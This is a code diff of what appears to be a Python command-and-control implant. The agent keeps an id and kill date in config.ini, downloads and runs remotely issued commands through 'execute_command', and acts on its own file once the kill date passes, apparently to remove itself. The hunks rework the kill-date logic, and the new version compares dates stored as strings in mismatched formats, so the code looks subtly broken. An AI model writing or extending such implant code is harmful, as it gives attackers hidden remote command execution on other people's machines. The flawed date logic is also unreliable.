@@ -44,23 +44,17 @@ def config_file():
                                'kill_date': new_kill_date}
             with open('config.ini', 'w') as configfile:
                 config.write(configfile)
-        return
 
     # First time to run
     if not os.path.exists(path=THIS_DIR / 'config.ini'):
         config['AGENT'] = {'id': agent_id}
         with open('config.ini', 'w') as configfile:
             config.write(configfile)
-        return
 
+    # Other runs
     else:
-        config.read('config.ini')
-        if 'id' in config['AGENT']:
-            agent_id = config['AGENT']['id']
-            print(agent_id)
         if 'kill_date' in config['AGENT']:
-            kill_agent_date = config['AGENT']['kill_date']
-            confirm_kill(kill_agent_date)
+            confirm_kill()
 
 
 def execute_command(command_issued):
@@ -142,7 +136,6 @@ def download_and_run_commands():
             if i == 0:
                 global kill_date_string
                 kill_date_string = command
-                # store_kill_date()
                 continue
 
             results.append(execute_command(command))
@@ -186,20 +179,13 @@ def store_kill_date():
             config.write(configfile)
 
 
-def confirm_kill(kill_agent_date):
-    if kill_date_string != '':
-        kill_date = datetime.datetime.strptime(kill_date_string, '%Y-%m-%d %H:%M')
-    else:
-        config = configparser.ConfigParser()
-        if not os.path.exists(path=THIS_DIR / 'config.ini'):
-            config['AGENT'] = {'id': randrange(500)}
-            with open('config.ini', 'w') as configfile:
-                config.write(configfile)
+def confirm_kill():
+    check = configparser.ConfigParser()
+    check.read('config.ini')
 
-        config.read('config.ini')
-        kill_date = config['AGENT']['kill_date']
+    kill_date = check['AGENT']['kill_date']
 
-    now = datetime.datetime.now()
+    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
     if now > kill_date:
         path = Path(__file__)
